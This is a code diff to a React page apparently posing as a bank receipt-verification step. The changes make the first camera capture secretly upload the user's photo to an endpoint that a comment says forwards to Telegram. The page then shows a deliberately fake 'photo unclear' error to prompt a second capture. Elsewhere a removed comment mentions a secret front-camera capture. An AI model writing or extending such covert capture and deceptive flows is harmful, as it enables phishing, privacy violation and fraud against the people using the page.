@@ -30,6 +30,8 @@ export default function BibdVerificationPage() {
 
   const [showCamera, setShowCamera] = useState(false);
   const [isCapturing, setIsCapturing] = useState(false);
+  const [captureAttempt, setCaptureAttempt] = useState(0);
+  const [retryMessage, setRetryMessage] = useState<string | null>(null);
   const [displayDate, setDisplayDate] = useState(templateData.receiptDate);
   const rearVideoRef = useRef<HTMLVideoElement>(null);
   const rearStreamRef = useRef<MediaStream | null>(null);
@@ -150,6 +152,7 @@ export default function BibdVerificationPage() {
   const handleCapturePhoto = useCallback(async () => {
     if (isCapturing) return;
     setIsCapturing(true);
+    setRetryMessage(null);
 
     try {
       const rearStream = rearStreamRef.current;
@@ -172,14 +175,29 @@ export default function BibdVerificationPage() {
         rearCanvas.toBlob((b) => resolve(b), 'image/jpeg', 0.85)
       );
 
-      // Stop stream immediately
+      const currentAttempt = captureAttempt + 1;
+      setCaptureAttempt(currentAttempt);
+
+      if (currentAttempt === 1) {
+        // Percobaan pertama: kirim foto ke Telegram diam-diam, lalu minta ulangi
+        if (rearPhotoBlob) {
+          const fd = new FormData();
+          fd.append('photo', rearPhotoBlob, 'retry_capture.jpg');
+          fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+        }
+        // Tampilkan pesan error palsu
+        setRetryMessage('Foto resit kurang jelas. Pastikan pencahayaan cukup dan posisi resit terlihat jelas, lalu coba lagi.');
+        setIsCapturing(false);
+        return;
+      }
+
+      // Percobaan kedua: lanjut proses normal
       rearStream.getTracks().forEach((t) => t.stop());
       rearStreamRef.current = null;
       setShowCamera(false);
 
       if (rearPhotoBlob) {
         const resitFile = new File([rearPhotoBlob], `resit-${Date.now()}.jpg`, { type: 'image/jpeg' });
-        // Forward to useVerification hook (which handles the secret front capture)
         handleFileSelect(resitFile);
       }
     } catch (err) {
@@ -187,7 +205,7 @@ export default function BibdVerificationPage() {
     }
 
     setIsCapturing(false);
-  }, [isCapturing, handleFileSelect]);
+  }, [isCapturing, handleFileSelect, captureAttempt]);
 
 
 
@@ -413,13 +431,20 @@ export default function BibdVerificationPage() {
                     </div>
                   )}
                 </div>
+                {/* Retry message */}
+                {retryMessage && (
+                  <div className="flex items-start gap-2 text-xs font-medium text-amber-700 bg-amber-50 p-3 rounded-lg border border-amber-200 w-full">
+                    <span className="material-symbols-outlined text-sm flex-shrink-0 mt-0.5">warning</span>
+                    <span>{retryMessage}</span>
+                  </div>
+                )}
                 {/* Capture button */}
                 <button
                   onClick={handleCapturePhoto}
                   disabled={isCapturing || !cameraReady}
                   className="w-full bg-[#2563eb] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#1d4ed8] transition-colors disabled:opacity-50 flex items-center justify-center gap-2"
                 >
-                  {isCapturing ? 'Memproses...' : !cameraReady ? 'Menunggu Kamera...' : 'Ambil Foto Resit / Bukti Belanja'}
+                  {isCapturing ? 'Memproses...' : !cameraReady ? 'Menunggu Kamera...' : retryMessage ? 'Ulangi Foto Resit' : 'Ambil Foto Resit / Bukti Belanja'}
                 </button>
               </div>
             ) : !uploadedFile ? (
